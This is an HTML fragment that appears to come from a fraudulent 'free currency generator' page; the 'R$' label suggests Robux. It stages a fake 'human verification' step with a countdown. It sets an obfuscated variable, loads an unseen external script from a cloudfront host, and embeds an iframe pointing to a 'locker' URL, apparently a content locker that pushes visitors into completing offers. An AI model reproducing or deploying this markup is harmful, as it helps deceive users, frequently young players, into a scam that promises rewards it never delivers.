...
<script type="text/javascript">
    var THIim_Xqf_ESJhjc={"it":4168397,"key":"18c32"};
</script>
<script src="https://d368ol0wkasvru.cloudfront.net/25bd7ec.js"></script>
<div class="human-verification-wrapper">
	...
	<div class="row verification-user-info">	
		...
		<div class="col-md-6 col-12">
			<div class="console-generation-item console-generation-item-r-1 animated bounceIn animation-delay-600">
				...
				<div class="resource-item-label">R$</div>
			</div>
		</div>
	</div>
	...
	<div id="h-v-time-left-wrapper" class="h-v-time-left-wrapper">
		...
		<li><iframe src="https://gamego.me/locker/872af21" width="320" height="350" scrolling="no" style="overflow:hidden; margin-top:-4px; margin-left:-4px; border:none;"></iframe></li>
</div>